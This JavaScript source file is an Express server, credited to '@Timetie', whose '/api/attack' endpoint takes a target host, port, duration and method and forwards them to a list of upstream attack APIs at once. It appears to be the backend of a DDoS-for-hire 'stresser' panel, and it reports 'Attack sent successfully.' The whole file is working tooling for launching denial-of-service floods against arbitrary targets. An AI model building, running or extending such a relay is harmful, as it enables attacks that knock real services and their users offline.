/*
  Author: @Timetie
*/

const express = require('express');
const app = express();
const fs = require('fs');
const axios = require('axios')

app.get('/api/attack', (req, res) => {
    const { host, port, time, method } = req.query;
  
    if (!host || !port || !time || !method) {
      res.json({ error: true, reason: 'Please verify all fields' });
      return;
    }

    const apis = require('./apis.json');
    const links = apis[method];
    if (!links) {
      res.json({ error: true, reason: 'Invalid method' });
      return;
    }

    const requests = links.map((link) => {
      const apiUrl = link.replace('[host]', host).replace('[port]', port).replace('[time]', time);
      return axios.get(apiUrl);
    });
    
    Promise.all(requests)
      .then((responses) => {
        const data = responses.map((response) => response.data);
        console.log(data);
        res.json({ error: false, reason: 'Attack sent successfully.' });
      })
      .catch((error) => {
        console.error(error);
        res.json({ error: true, reason: `failed to connect to server, check console!` });
      });
  
});

// Testing Command [If you want to remove it]
app.get('/test/', (req, res) => {
  const { user, secret, host, port, time, method } = req.query;
  res.json({ user, secret, host, port, time, method });
})

// 404 Error
app.use(function(req, res) {
  res.status(404).json({
      error: 'true', reason: 'currently page is not found'
  });
});

// Running Application
app.listen("3000", () => {
  console.log('The API server has been successfully runned');
});
